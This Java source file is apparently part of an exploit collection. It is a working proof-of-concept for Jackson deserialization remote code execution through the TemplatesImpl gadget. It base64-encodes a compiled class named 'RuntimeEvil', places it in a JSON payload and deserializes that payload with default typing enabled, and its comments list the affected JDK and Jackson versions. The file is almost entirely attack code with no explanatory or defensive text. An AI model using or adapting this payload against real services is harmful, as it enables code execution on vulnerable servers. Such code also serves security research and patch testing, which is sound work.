package org.exploit.third.jackson;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.unboundid.util.Base64;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

//jdk7u21 or jdk8u20
//Jackson 2.6系列 < 2.6.7.1
//Jackson 2.7系列 < 2.7.9.1
//Jackson 2.8系列 < 2.8.8.1
public class enableDT_TemplatesImpl {
    public static class enableDefaultTyping_Test {
        public Object object;
    }
    public static void main(String[] args) throws IOException {
        String exp = readClassStr();
        String jsonInput = aposToQuotes("{\"object\":['com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n" +
                "{\n" +
                "'transletBytecodes':['"+exp+"'],\n" +
                "'transletName':'test',\n" +
                "'outputProperties':{}\n" +
                "}\n" +
                "]\n" +
                "}");
        System.out.printf(jsonInput);
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        enableDefaultTyping_Test test;
        try {
            test = mapper.readValue(jsonInput, enableDefaultTyping_Test.class);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }

    public static String readClassStr() throws IOException {
        byte[] code = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        return Base64.encode(code);
    }
}
